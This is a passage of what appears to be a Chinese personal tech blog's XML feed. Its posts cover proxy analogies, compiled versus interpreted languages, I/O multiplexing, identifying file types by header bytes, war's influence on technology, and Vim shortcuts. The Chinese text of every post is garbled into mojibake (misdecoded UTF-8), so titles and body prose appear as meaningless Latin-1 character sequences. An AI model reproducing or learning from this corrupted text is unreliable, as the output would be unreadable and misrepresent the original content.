å¯†ï¼Œä»¥ä¿è¯é€šä¿¡åŒæ–¹å†…å®¹çš„å®‰å…¨æ€§ã€‚</p><h1 id="ä»£ç†"><a href="#ä»£ç†" class="headerlink" title="ä»£ç†"></a>ä»£ç†</h1><p>åœ¨ç¾è‹å†·æˆ˜æ—¶æœŸï¼Œä¸œå¾·ä¸è¥¿å¾·æ— æ³•ç›´æ¥é€šä¿¡ï¼Œæ­¤æ—¶ä½ éœ€è¦å…ˆæŠŠç”µè¯æ‰“åˆ°ä¸­ç«‹å›½ç‘å£«çš„ä¸€ä¸ªæœ‹å‹é‚£é‡Œï¼Œä½ æŠŠä½ æƒ³è¯´çš„è¯ç»ç‘å£«çš„æœ‹å‹è½¬è¿°å‘Šè¯‰å¯¹æ–¹ï¼Œç‘å£«çš„æœ‹å‹åœ¨è¿™é‡Œå°±å……å½“äº†ä»£ç†çš„è§’è‰²ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹çš„ä»£ç†ï¼Œä½ ä¸ä»…å¯ä»¥çªç ´æ— æ³•è®¿é—®çš„é™åˆ¶ï¼Œä¹Ÿå¯ä»¥éšè—è‡ªå·±çš„èº«ä»½ï¼Œè®©è¥¿å¾·çš„æ¥å¬æ–¹ä»¥ä¸ºæ˜¯ç‘å£«çš„äººåœ¨å’Œå¥¹äº¤è°ˆã€‚</p><p>å¦ä¸€ä¸ªä»£ç†çš„ä¾‹å­æ˜¯ï¼Œå‡å¦‚ä½ æƒ³ä»åŒ—äº¬é‚®å¯„ä¸€ä»½æ–‡ä»¶ç»™æ·±åœ³çš„æœ‹å‹ï¼Œä½ å¯ä»¥é€‰æ‹©æºå¸¦æ–‡ä»¶ä¹˜åç«è½¦æˆ–è€…é£æœºç›´æ¥é€åˆ°æ·±åœ³ï¼ŒåŒæ ·å¯ä»¥æ‰˜ç®¡ç»™å¿«é€’ï¼Œè®©å¿«é€’å°å“¥æŠŠæ–‡ä»¶å¸¦ç»™ä½ æœ‹å‹ï¼Œè¿™é‡Œçš„å¿«é€’å°å“¥å°±æ˜¯æ‰®æ¼”äº†ä»£ç†çš„è§’è‰²ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»£ç†å¯ä»¥ç›‘ç®¡åŒ…è£¹ï¼Œç¦æ­¢é‚®é€’è¿ç¦å±é™©ç‰©å“ï¼Œä½†åŒæ ·å¼•å…¥ä»£ç†å¯èƒ½å¯¼è‡´åŒ…è£¹çš„é—å¤±æŸæ¯ï¼Œå¿«é€’å°å“¥ç”Ÿç—…å¯¼è‡´å»¶è¿Ÿåˆ°è¾¾çš„é—®é¢˜ã€‚</p><h1 id="æ­£å‘ä»£ç†-VS-åå‘ä»£ç†"><a href="#æ­£å‘ä»£ç†-VS-åå‘ä»£ç†" class="headerlink" title="æ­£å‘ä»£ç† VS åå‘ä»£ç†"></a>æ­£å‘ä»£ç† VS åå‘ä»£ç†</h1><p>ä»ä»¥å†·æˆ˜æœŸé—´çš„é€šè¯ä¸ºä¾‹ï¼Œè¥¿å¾·çš„æ¥å¬æ–¹ä¸çŸ¥é“ç”µè¯çš„å†…å®¹æ˜¯ä¸œå¾·çš„æœ‹å‹æ‰“æ¥çš„ï¼Œä»¥ä¸ºæ˜¯ç‘å£«çš„æœ‹å‹æ‰“çš„ï¼Œè¿™å°±æ˜¯æ­£å‘ä»£ç†ï¼›å¦‚æœä¸œå¾·çš„æœ‹å‹ä¸çŸ¥é“é€šè¯çš„å†…å®¹æ˜¯è¥¿å¾·çš„æœ‹å‹è¯´çš„ï¼Œè¿™å°±æ˜¯åå‘ä»£ç†ã€‚ç®€è€Œè¨€ä¹‹ï¼Œæ­£å‘ä»£ç†éšè—æ‹¨æ‰“æ–¹(å®¢æˆ·ç«¯)ï¼Œåå‘ä»£ç†éšè—æ¥å¬æ–¹(æœåŠ¡ç«¯)ã€‚</p><blockquote><p>æ¥è‡ª<a href="https://www.zhihu.com/question/24723688/answer/128105528" target="_blank" rel="noopener">åå‘ä»£ç†ä¸ºä½•å«åå‘ä»£ç†ï¼Ÿ - åˆ˜å¿—å†›çš„å›ç­”</a></p></blockquote><h1 id="é™æ€ç¼–è¯‘å‹è¯­è¨€-VS-åŠ¨æ€è§£é‡Šå‹è¯­è¨€"><a href="#é™æ€ç¼–è¯‘å‹è¯­è¨€-VS-åŠ¨æ€è§£é‡Šå‹è¯­è¨€" class="headerlink" title="é™æ€ç¼–è¯‘å‹è¯­è¨€ VS åŠ¨æ€è§£é‡Šå‹è¯­è¨€"></a>é™æ€ç¼–è¯‘å‹è¯­è¨€ VS åŠ¨æ€è§£é‡Šå‹è¯­è¨€</h1><p>é™æ€ç¼–è¯‘å‹è¯­è¨€å°±åƒæ˜¯åšå¥½äº†ä¸€æ¡Œå­èœå†å¼€åƒï¼ŒåŠ¨æ€è§£é‡Šå‹è¯­è¨€å°±åƒæ˜¯åƒç«é”…ï¼Œè¾¹åšè¾¹åƒã€‚</p><blockquote><p>æ¥è‡ª <a href="https://www.zhihu.com/question/21486706/answer/32975999" target="_blank" rel="noopener">ç¨‹åºçš„ç¼–è¯‘ä¸è§£é‡Šæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ - çŸ¥ä¹</a></p></blockquote><h1 id="I-O-å¤šè·¯å¤ç”¨æ¨¡å‹"><a href="#I-O-å¤šè·¯å¤ç”¨æ¨¡å‹" class="headerlink" title="I/O å¤šè·¯å¤ç”¨æ¨¡å‹"></a>I/O å¤šè·¯å¤ç”¨æ¨¡å‹</h1><p>å‡è®¾ä½ æ˜¯ä¸€ä¸ªè€å¸ˆï¼Œè®© 30 ä¸ªå­¦ç”Ÿè§£ç­”ä¸€é“é¢˜ç›®ï¼Œç„¶åæ£€æŸ¥å­¦ç”Ÿåšçš„æ˜¯å¦æ­£ç¡®ï¼Œä½ æœ‰ä¸‹é¢å‡ ä¸ªé€‰æ‹©ï¼š</p><ol><li>ç¬¬ä¸€ç§é€‰æ‹©ï¼šæŒ‰é¡ºåºé€ä¸ªæ£€æŸ¥ï¼Œå…ˆæ£€æŸ¥ Aï¼Œç„¶åæ˜¯ Bï¼Œä¹‹åæ˜¯ Cã€Dã€‚ã€‚ã€‚è¿™ä¸­é—´å¦‚æœæœ‰ä¸€ä¸ªå­¦ç”Ÿå¡ä¸»ï¼Œå…¨ç­éƒ½ä¼šè¢«è€½è¯¯ã€‚è¿™ç§æ¨¡å¼å°±å¥½æ¯”ï¼Œä½ ç”¨å¾ªç¯æŒ¨ä¸ªå¤„ç† socketï¼Œæ ¹æœ¬ä¸å…·æœ‰å¹¶å‘èƒ½åŠ›ã€‚</li><li>ç¬¬äºŒç§é€‰æ‹©ï¼šä½ åˆ›å»º 30 ä¸ªåˆ†èº«ï¼Œæ¯ä¸ªåˆ†èº«æ£€æŸ¥ä¸€ä¸ªå­¦ç”Ÿçš„ç­”æ¡ˆæ˜¯å¦æ­£ç¡®ã€‚ è¿™ç§ç±»ä¼¼äºä¸ºæ¯ä¸€ä¸ªç”¨æˆ·åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æˆ–è€…çº¿ç¨‹å¤„ç†è¿æ¥ã€‚</li><li>ç¬¬ä¸‰ç§é€‰æ‹©ï¼Œä½ ç«™åœ¨è®²å°ä¸Šç­‰ï¼Œè°è§£ç­”å®Œè°ä¸¾æ‰‹ã€‚è¿™æ—¶ Cã€D ä¸¾æ‰‹ï¼Œè¡¨ç¤ºä»–ä»¬è§£ç­”é—®é¢˜å®Œæ¯•ï¼Œä½ ä¸‹å»ä¾æ¬¡æ£€æŸ¥ Cã€D çš„ç­”æ¡ˆï¼Œç„¶åç»§ç»­å›åˆ°è®²å°ä¸Šç­‰ã€‚æ­¤æ—¶ Eã€A åˆä¸¾æ‰‹ï¼Œç„¶åå»å¤„ç† E å’Œ Aã€‚ã€‚ã€‚ è¿™ç§å°±æ˜¯ IO å¤ç”¨æ¨¡å‹ï¼ŒLinux ä¸‹çš„ selectã€poll å’Œ epoll å°±æ˜¯å¹²è¿™ä¸ªçš„ã€‚å°†ç”¨æˆ· socket å¯¹åº”çš„ fd æ³¨å†Œè¿› epollï¼Œç„¶å epoll å¸®ä½ ç›‘å¬å“ªäº› socket ä¸Šæœ‰æ¶ˆæ¯åˆ°è¾¾ï¼Œè¿™æ ·å°±é¿å…äº†å¤§é‡çš„æ— ç”¨æ“ä½œã€‚æ­¤æ—¶çš„ socket åº”è¯¥é‡‡ç”¨éé˜»å¡æ¨¡å¼ã€‚</li></ol><blockquote><p>æ¥è‡ª<a href="https://www.zhihu.com/question/28594409/answer/52835876" target="_blank" rel="noopener">I/Oå¤šè·¯å¤ç”¨æŠ€æœ¯ï¼ˆmultiplexingï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ - æŸ´å°å–µçš„å›ç­”</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºæ˜¯å¦‚ä½•å­˜å‚¨ä¸è§£è¯»å„ç§æ–‡ä»¶çš„</title>
      <link href="/post/how-computers-store-and-interpret-files/"/>
      <url>/post/how-computers-store-and-interpret-files/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1ga8wegt7vsj30qo0gotbt.jpg" alt=""></p><a id="more"></a><blockquote><p>æœ¬æ–‡çµæ„Ÿæ¥è‡ªäº<a href="https://www.zhihu.com/question/19971994/answer/570107874" target="_blank" rel="noopener">æ–‡æœ¬æ–‡ä»¶å’ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„åŒºåˆ«ï¼Ÿè¯·ä¸¾ä¾‹è¯´æ˜ - æœºäº‹æœ¬çš„å›ç­”</a></p></blockquote><p>åœ¨è®¡ç®—æœºçš„ä¸–ç•Œé‡Œï¼Œæ— è®ºæ˜¯æ–‡æœ¬ã€éŸ³é¢‘ã€è§†é¢‘ã€å›¾ç‰‡ï¼Œè¿˜æ˜¯å‹ç¼©æ–‡ä»¶ï¼Œä¸€åˆ‡éƒ½æ˜¯ <code>0</code> å’Œ <code>1</code>ï¼Œä¸åŒçš„æ–‡ä»¶ç±»å‹é€šè¿‡å†…å®¹å‰ç¼€æ ‡è¯†ï¼Œè€Œä¸æ˜¯é€šè¿‡æ–‡ä»¶ååç¼€æ¥æ ‡è¯†ï¼Œåç¼€åªæ˜¯ä¸ºäº†è®©äººç±»è¯»æ‡‚è¿™ä¸ªæ–‡ä»¶åº”è¯¥ç”¨ä»€ä¹ˆç¨‹åºæ¥æ­£ç¡®çš„è§£ç ã€‚å¦‚æœç”¨è®°äº‹æœ¬æ‰“å¼€ä¸€ä¸ªç…§ç‰‡ï¼Œå°±ä¼šå¾—åˆ°ä¹±ç ï¼Œå¦‚æœè®°äº‹æœ¬çš„ç¼–ç è®¾ç½®ä¸æ–‡ä»¶ä¸åŒï¼ŒåŒæ ·ä¼šå¾—åˆ°ä¹±ç ï¼Œå¦‚åŒé¸¡åŒé¸­è®²ã€‚æ–‡æœ¬ç¼–ç å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸åŒçš„å­—å…¸ï¼Œæˆ‘ä»¬é€šè¿‡ä¸åŒçš„å­—å…¸æ¥ç¼–/è§£ç äººç±»è¯­è¨€ä¸è®¡ç®—æœºè¯­è¨€ã€‚æˆ‘ä»¬åº”è¯¥æ€ä¹ˆæŸ¥çœ‹è®¡ç®—æœºå†…éƒ¨çš„å­˜å‚¨å†…å®¹å‘¢ï¼Ÿåœ¨ VS Code å®‰è£…<a href="https://marketplace.visualstudio.com/items?itemName=slevesque.vscode-hexdump" target="_blank" rel="noopener">hexdump</a>å°±å¯ä»¥æŸ¥çœ‹å„ç§æ–‡ä»¶ç±»å‹çš„äºŒè¿›åˆ¶å†…å®¹äº†ã€‚</p><h1 id="æ–‡æœ¬æ–‡ä»¶"><a href="#æ–‡æœ¬æ–‡ä»¶" class="headerlink" title="æ–‡æœ¬æ–‡ä»¶"></a>æ–‡æœ¬æ–‡ä»¶</h1><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8wyvt4n6j31e007mabj.jpg" alt=""></p><p>æˆ‘ä»¬é€šè¿‡ASCIIå¯¹ç…§è¡¨å¯ä»¥å‘ç°ï¼ŒUTF8 ä¸‹çš„ä¸­æ–‡ï¼Œæ¯ä¸ªæ±‰å­—å ç”¨äº† 3 ä¸ªå­—èŠ‚ï¼š<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8x0ormj9j30qg0g876k.jpg" alt=""></p><p>æ¯ä¸ª UTF8 ä¸‹çš„ emoji å­—ç¬¦å ç”¨äº† 4 ä¸ªå­—èŠ‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8x1gpflfj30no0ii0v0.jpg" alt=""></p><h1 id="CSSæ–‡ä»¶"><a href="#CSSæ–‡ä»¶" class="headerlink" title="CSSæ–‡ä»¶"></a>CSSæ–‡ä»¶</h1><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8w3uv84xj31760e4af5.jpg" alt=""></p><h1 id="GIFæ–‡ä»¶"><a href="#GIFæ–‡ä»¶" class="headerlink" title="GIFæ–‡ä»¶"></a>GIFæ–‡ä»¶</h1><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8w44b4npj317a0g8tdw.jpg" alt=""></p><h1 id="JPGæ–‡ä»¶"><a href="#JPGæ–‡ä»¶" class="headerlink" title="JPGæ–‡ä»¶"></a>JPGæ–‡ä»¶</h1><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8w4c030bj316u0bwjv2.jpg" alt=""></p><h1 id="PS-å¤„ç†è¿‡çš„-JPG-æ–‡ä»¶"><a href="#PS-å¤„ç†è¿‡çš„-JPG-æ–‡ä»¶" class="headerlink" title="PS å¤„ç†è¿‡çš„ JPG æ–‡ä»¶"></a>PS å¤„ç†è¿‡çš„ JPG æ–‡ä»¶</h1><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8w6red6zj318u0nsn42.jpg" alt=""></p><h1 id="PNG-æ–‡ä»¶"><a href="#PNG-æ–‡ä»¶" class="headerlink" title="PNG æ–‡ä»¶"></a>PNG æ–‡ä»¶</h1><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8w6ia9mpj31600fyq8f.jpg" alt=""></p><h1 id="MP3-æ–‡ä»¶"><a href="#MP3-æ–‡ä»¶" class="headerlink" title="MP3 æ–‡ä»¶"></a>MP3 æ–‡ä»¶</h1><p>æ™®é€šçš„ mp3 å¤ªå¤§äº†ï¼Œå°±æ‹¿æè£æµ©çš„ã€Šè´è´ã€‹åšåˆ†æäº†<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8w4jw2l4j316k0jq0xf.jpg" alt=""></p><blockquote><p>å…³äº MP3 çš„æ–‡ä»¶ç»“æ„å¯ä»¥æŸ¥çœ‹è¿™ç¯‡æ–‡ç«  <a href="https://blog.csdn.net/u010650845/article/details/53520426" target="_blank" rel="noopener">MP3 æ–‡ä»¶ç»“æ„è§£æ (è¶…è¯¦ç»†)</a></p></blockquote><h1 id="MP4-æ–‡ä»¶"><a href="#MP4-æ–‡ä»¶" class="headerlink" title="MP4 æ–‡ä»¶"></a>MP4 æ–‡ä»¶</h1><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8w5gl238j31820de0wa.jpg" alt=""></p><blockquote><p>å…³äº MP4 çš„æ–‡ä»¶æ¥å£å¯ä»¥æŸ¥çœ‹<a href="https://www.file-recovery.com/mp4-signature-format.htm" target="_blank" rel="noopener">MP4 Signature Format: Documentation &amp; Recovery Example</a></p></blockquote><h1 id="PDFæ–‡ä»¶"><a href="#PDFæ–‡ä»¶" class="headerlink" title="PDFæ–‡ä»¶"></a>PDFæ–‡ä»¶</h1><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8w67z72oj317u0cugq7.jpg" alt=""></p><h1 id="ZIPæ–‡ä»¶"><a href="#ZIPæ–‡ä»¶" class="headerlink" title="ZIPæ–‡ä»¶"></a>ZIPæ–‡ä»¶</h1><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8wcy6xluj316i0gm0yl.jpg" alt=""></p><p>é€šè¿‡éªŒè¯å¯çŸ¥ï¼Œæ–‡ä»¶ç±»å‹æ˜¯åœ¨æ–‡ä»¶å¼€å¤´å­—ç¬¦ä¸­æ ‡æ˜çš„ï¼ˆLinux ä¸­çš„<code>file</code>å‘½ä»¤å³ä¸ºæ­¤æ–¹å¼åˆ¤æ–­ï¼‰ï¼Œå› æ­¤ï¼Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸èƒ½ä»…ä»¥åç¼€æ¥åˆ¤æ–­æ–‡ä»¶çš„ç±»å‹ï¼Œè¿™ä¼šå­˜åœ¨å¾ˆå¤§çš„å®‰å…¨éšæ‚£ã€‚</p><h1 id="æ„å¤–å‘ç°"><a href="#æ„å¤–å‘ç°" class="headerlink" title="æ„å¤–å‘ç°"></a>æ„å¤–å‘ç°</h1><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga8vtlx3q6j30ln09ltb1.jpg" alt=""><br>åŸè´´åœ°å€ï¼š<a href="https://www.v2ex.com/t/388152" target="_blank" rel="noopener">https://www.v2ex.com/t/388152</a></p><p>ç»è¿‡éªŒè¯ï¼Œæœç„¶æ˜¯è¿™æ ·çš„ï¼Œå¤§å®¶ä¸ç”¨æ‰’æˆ‘çš„åšå®¢å›¾ç‰‡äº†ï¼Œè¿™æ˜¯å›¾åºŠå¼€å‘è€…è‡ªå·±çš„ä¸€ä¸ªå…¬å…±è´¦å·ï¼Œä¹Ÿæ˜¯ç¬¦åˆä¸Šè¿°è§„åˆ™çš„ï¼Œæœ€ç»ˆä¼šæŒ‡å‘ä¸€ä¸ªåƒµå°¸è´¦å·ï¼Œåˆ†æå…³æ³¨ä¸è¢«å…³æ³¨ä»¥åŠä½ç½®ä¿¡æ¯ï¼Œå†ä¸å¼€å‘è€…çš„éƒ¨åˆ†ä¿¡æ¯è¿›è¡Œå°è¯ï¼Œå¯ä»¥å¾—åˆ°å¾ˆå¤§æ¦‚ç‡è¯¥è´¦å·ç”±å›¾åºŠå¼€å‘è€…æ‰€æœ‰ã€‚</p><p>å†™åˆ°è¿™é‡Œï¼Œçªç„¶å‘ç°ä»¥åå¯ä»¥å†™ä¸ª Python è„šæœ¬ï¼ŒæŠ“å– V2EXï¼ŒçŸ¥ä¹ï¼Œè´´å§ç­‰å¹³å°é«˜ç‚¹å‡»ç‡çš„å¸–å­ï¼Œé€šå¸¸è¿™æ ·çš„å¸–å­ä¼šæœ‰å¾ˆå¤§çš„ä»·å€¼ï¼ŒèŠ‚çœè‡ªå·±çš„é˜…è¯»æ—¶é—´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æˆ˜äº‰å¯¹ç§‘æŠ€çš„å½±å“</title>
      <link href="/post/war-effect-for-tech/"/>
      <url>/post/war-effect-for-tech/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1ga35rsass8j30sg0ixq5f.jpg" alt=""></p><a id="more"></a><p>æˆ˜äº‰å‚¬ç”Ÿäº†å¤§é‡çš„ç§‘æŠ€ï¼Œä¸€æ–¹é¢æˆ˜äº‰åœ¨æ‘§æ¯äººä»¬çš„ç”Ÿæ´»ï¼Œå¦ä¸€æ–¹é¢æˆ˜äº‰åˆå¯¹æœªæ¥äº§ç”Ÿäº†æ·±è¿œçš„å½±å“ã€‚</p><p>åœ¨æˆ˜äº‰ä¸­ï¼Œå¹³æ°‘å¾—ä»¥è·å¾—å¿«é€Ÿä¸Šå‡çš„é˜¶å±‚é€šé“ï¼Œå¤§é‡çš„äººæ‰å¾—ä»¥æ–½å±•æŠ±è´Ÿï¼Œå‚æˆ˜å›½å…¨åŠ›æ¨è¿›æŠ€æœ¯çš„å‘å±•ã€‚äºŒæˆ˜ä¸­æ¶Œç°äº†å¤§é‡çš„äººæ‰ï¼Œå„é¡¹æŠ€æœ¯è¿…çŒ›å‘å±•ã€‚è¯¸å¦‚åŸå­èƒ½ã€è®¡ç®—æœºã€å¯†ç å­¦ã€èˆªå¤©èˆªç©ºç­‰ã€‚</p><p>ç¾è‹å†·æˆ˜æœŸé—´ï¼Œä¸¤å›½ç–¯ç‹‚ç‚¹ç§‘æŠ€æ ‘ï¼ŒæŠ¢å¤ºå¤ªç©ºèµ„æºï¼Œç ”å‘é‡å‹æ­¦å™¨ã€‚æ—¢å¯¹å„å›½å®‰å…¨é€ æˆææ…Œï¼Œä¹ŸåŠ é€Ÿäº†ç›¸å…³é¢†åŸŸçš„æ¢ç´¢è¿›ç¨‹ã€‚</p><p>æˆ˜äº‰åæ–°çš„ä¸–ç•Œæ ¼å±€ï¼Œä¹Ÿå¯¼è‡´äº†éƒ¨åˆ†åœ°åŒºçš„å†²çªä¸æ–­ï¼ˆææ€–ä¸»ä¹‰ç››è¡Œï¼‰ï¼Œæœ‰çš„å›½å®¶ç»æµå¿«é€Ÿå¤è‹å´›èµ·ï¼ˆä¸­æ—¥ï¼‰ï¼Œæœ‰çš„å›½å®¶éœ¸ä½æ˜“ä¸»ï¼ˆè‹±å›½ï¼‰ã€‚</p><p>å‡ ä¹æˆ‘ä»¬ç°åœ¨çš„æ¯ä¸€é¡¹é‡è¦æŠ€æœ¯éƒ½æ˜¯â€œå—ç›Šâ€äºæˆ˜äº‰â€”â€”è®¡ç®—æœºæ˜¯ä¸ºäº†åœ¨æˆ˜äº‰ä¸­å¿«é€Ÿç ´è¯‘å¯†ç ï¼Œæ‰‹æœºé›å½¢æœ€åˆç”¨äºåè°ƒå†›äº‹è¡ŒåŠ¨ï¼Œäº’è”ç½‘ç”¨äºç¾è‹å†·æˆ˜çš„å¯¹æŠ—ï¼ŒGPS æ›´é‡è¦çš„æ˜¯ç²¾å‡†åˆ¶å¯¼ã€‚ä½†è¿™äº›ä»…ä»…æ˜¯æˆ˜äº‰çš„å‰¯äº§ç‰©ï¼Œæˆ˜äº‰æ‰€ç»™äººä»¬é€ æˆçš„åˆ›ä¼¤æ˜¯éš¾ä»¥å¼¥è¡¥çš„ï¼Œå—äº¬å¤§å± æ€ 30 ä¸‡çš„å†¤é­‚ï¼Œå¥¥æ–¯ç»´è¾›é›†ä¸­è¥æ•°ç™¾ä¸‡çš„äº¡é­‚ä»åœ¨è­¦é†’ç€ä¸–äººã€‚å’Œå¹³è¯ç”Ÿç§‘å­¦ï¼Œæˆ˜äº‰æ¨åŠ¨æŠ€æœ¯ã€‚</p><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://mp.weixin.qq.com/s/qan1PVOgSc2qdZqlKALxDw" target="_blank" rel="noopener">å°ç«ç®­ | å…¨çƒæ ¸æ­¦å™¨å¹´åº¦æŠ¥å‘Š2019å¹´æœ€ç»ˆç‰ˆ</a></li><li><a href="https://mp.weixin.qq.com/s/vV4Wk3xNw-7j27a4DAAXfw" target="_blank" rel="noopener">å°ç«ç®­ | ç›˜ç‚¹2019å¹´äººç±»èˆªå¤©çš„20ä¸ªå¤§äº‹ä»¶</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> éšç¬”æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vim ç¬”è®°</title>
      <link href="/post/vim-notes/"/>
      <url>/post/vim-notes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1ga1uo5tskuj30m80ciaay.jpg" alt=""></p><a id="more"></a><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga1ubf7k4pj30sg0k30zg.jpg" alt=""></p><blockquote><ul><li>é…ç½®æ–‡ä»¶ <code>$vim ~/.vimrc</code></li><li>åœ¨ç¼–è¾‘é…ç½®æ–‡ä»¶å‰ï¼Œå°†åŸæœ‰æ–‡ä»¶è¿›è¡Œå¤‡ä»½æ€»æ˜¯ä¸€ä¸ªå¥½çš„ä¹ æƒ¯ã€‚æ¯”å¦‚<code>cp .vimrc .vimrc.bak</code></li><li>å¦å¤–ï¼Œåœ¨ç¼–è¾‘é…ç½®æ–‡ä»¶æ—¶ï¼Œå°†æ”¹åŠ¨æ·»åŠ æ³¨é‡Šä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¹ æƒ¯ï¼Œå¸®æœªæ¥çš„è‡ªå·±ä¸€ä¸ªå¿™å§ã€‚</li></ul></blockquote><hr><h1 id="ä¸€ã€ç¼–è¾‘"><a href="#ä¸€ã€ç¼–è¾‘" class="headerlink" title="ä¸€ã€ç¼–è¾‘"></a>ä¸€ã€ç¼–è¾‘</h1><table><thead><tr><th align="center">å¿«æ·é”®</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>0</code></td><td align="center">è¡Œé¦–</td></tr><tr><td align="center"><code>$</code></td><td align="center">è¡Œå°¾</td></tr><tr><td align="center"><code>^</code></td><td align="center">éç©ºè¡Œé¦–</td></tr><tr><td align="center"><code>g_</code></td><td align="center">éç©ºè¡Œæœ«</td></tr><tr><td align="center"><code>w</code></td><td align="center">ä¸‹ä¸ªè¯å¤´</td></tr><tr><td align="center"><code>b</code></td><td align="center">ä¸Šä¸ªè¯å¤´</td></tr><tr><td align="center"><code>e</code></td><td align="center">ä¸‹ä¸ªè¯å°¾</td></tr><tr><td align="center"><code>x</code></td><td align="center">å‘å³åˆ é™¤</td></tr><tr><td align="center"><code>X</code></td><td align="center">å‘å·¦åˆ é™¤</td></tr><tr><td align="center"><code>%</code></td><td align="center">æ‹¬å·åŒ¹é…</td></tr><tr><td align="center"><code>J</code></td><td align="center">åˆå¹¶ä¸¤è¡Œ</td></tr><tr><td align="center"><code>H</code></td><td align="center">å±å¹•é¡¶è¡Œ</td></tr><tr><td align="center"><code>M</code></td><td align="center">å±å¹•ä¸­é—´è¡Œ</td></tr><tr><td align="center"><code>L</code></td><td align="center">å±å¹•åº•è¡Œ</td></tr><tr><td align="center"><code>zz</code></td><td align="center">å½“å‰è¡Œç½®äºå±å¹•ä¸­å¤®</td></tr><tr><td align="center"><code>zt</code></td><td align="center">é¡¶éƒ¨</td></tr><tr><td align="center"><code>zb</code></td><td align="center">åº•éƒ¨</td></tr><tr><td align="center"><code>gg</code></td><td align="center">è·³è½¬åˆ°é¡µé¦–</td></tr><tr><td align="center"><code>G</code></td><td align="center">è·³è½¬åˆ°é¡µå°¾</td></tr><tr><td align="center"><code>nG</code></td><td align="center">è·³è½¬åˆ°æŒ‡å®šè¡Œ</td></tr><tr><td align="center"><code>yy</code></td><td align="center">æ‹·è´ä¸€è¡Œ</td></tr><tr><td align="center"><code>ye</code></td><td align="center">ä»å½“å‰ä½ç½®æ‹·è´åˆ°è¯å°¾</td></tr><tr><td align="center"><code>ge</code></td><td align="center">ç§»è‡³å‰ä¸€ä¸ªå•è¯çš„æœ€åä¸€ä¸ªå­—ç¬¦</td></tr><tr><td align="center"><code>u</code></td><td align="center">æ’¤é”€ä¸Šä¸€æ­¥æ“ä½œ</td></tr><tr><td align="center"><code>ctrl-r</code></td><td align="center">æ¢å¤ä¸Šä¸€æ­¥æ“ä½œï¼ˆuçš„åå‘½ä»¤ï¼‰</td></tr><tr><td align="center"><code>~</code></td><td align="center">è½¬æ¢å¤§å°å†™</td></tr><tr><td align="center"><code>dNw</code></td><td align="center">åˆ é™¤Nä¸ªè¯åˆ°ä¸‹ä¸ªè¯å¤´</td></tr><tr><td align="center"><code>dNe</code></td><td align="center">åˆ é™¤Nä¸ªè¯åˆ°ä¸‹ä¸ªè¯å°¾</td></tr><tr><td align="center"><code>r</code></td><td align="center">æ›¿æ¢å…‰æ ‡å¤„å­—ç¬¦ï¼ŒNrè¡¨ç¤ºå°†å¤šä¸ªå­—ç¬¦æ›¿æ¢ä¸ºå³å°†è¾“å…¥åˆ°å­—ç¬¦</td></tr><tr><td align="center"><code>R</code></td><td align="center">ä»å½“å‰å…‰æ ‡æ‰€åœ¨å¤„å¼€å§‹æ›¿æ¢</td></tr><tr><td align="center"><code>xp</code></td><td align="center">äº¤æ¢å·¦å³ä¸¤ä¸ªå­—ç¬¦</td></tr><tr><td align="center"><code>ddp</code></td><td align="center">äº¤æ¢ä¸Šä¸‹ä¸¤è¡Œ</td></tr><tr><td align="center"><code>yNw</code></td><td align="center">å¤åˆ¶Nä¸ªè¯</td></tr><tr><td align="center"><code>Nyy</code></td><td align="center">å¤åˆ¶Nè¡Œ</td></tr><tr><td align="center"><code>y\$</code></td><td align="center">å¤åˆ¶åˆ°è¡Œå°¾</td></tr><tr><td align="center"><code>s</code></td><td align="center">åˆ é™¤å…‰æ ‡å¤„å­—ç¬¦å¹¶æ’å…¥</td></tr><tr><td align="center"><code>S</code></td><td align="center">åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œå¹¶æ’å…¥ï¼ˆåŒCï¼Œccï¼Œc$ï¼‰</td></tr><tr><td align="center"><code>db</code></td><td align="center">åˆ é™¤å‰è¾¹çš„å­—ç¬¦</td></tr><tr><td align="center"><code>dw</code></td><td align="center">åˆ é™¤åè¾¹çš„å­—ç¬¦</td></tr><tr><td align="center"><code>diw</code></td><td align="center">åˆ é™¤å…‰æ ‡å¤„å­—ç¬¦ï¼Œä¸å«ç©ºç™½å­—ç¬¦</td></tr><tr><td 